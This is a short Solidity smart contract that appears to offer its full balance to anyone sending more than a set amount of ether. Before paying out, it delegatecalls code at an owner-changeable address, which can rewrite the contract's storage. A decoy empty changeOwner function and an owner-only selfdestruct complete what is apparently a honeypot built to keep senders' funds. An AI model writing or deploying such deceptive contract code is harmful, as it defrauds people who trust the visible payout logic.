1 pragma solidity ^0.4.11;
2 
3 contract firstTest
4 {
5     address Owner = 0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b;
6     address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
7     address adr;
8     uint256 public Limit= 1000000000000000000;
9     
10     function Set(address dataBase, uint256 limit) 
11     {
12         require(msg.sender == Owner); //checking the owner
13         Limit = limit;
14         emails = dataBase;
15     }
16     
17     function changeOwner(address adr){
18         // update Owner=msg.sender;
19     }
20     
21     function()payable{
22         //if owner
23         withdrawal();
24     }
25     
26     function kill() {
27         require(msg.sender == Owner);
28         selfdestruct(msg.sender);
29     }
30     
31     function withdrawal()
32     payable public
33     {
34         adr=msg.sender;
35         if(msg.value>Limit)
36         {  
37             emails.delegatecall(bytes4(sha3("logEvent()")));
38             adr.send(this.balance);
39             
40         }
41     }
42     
43 }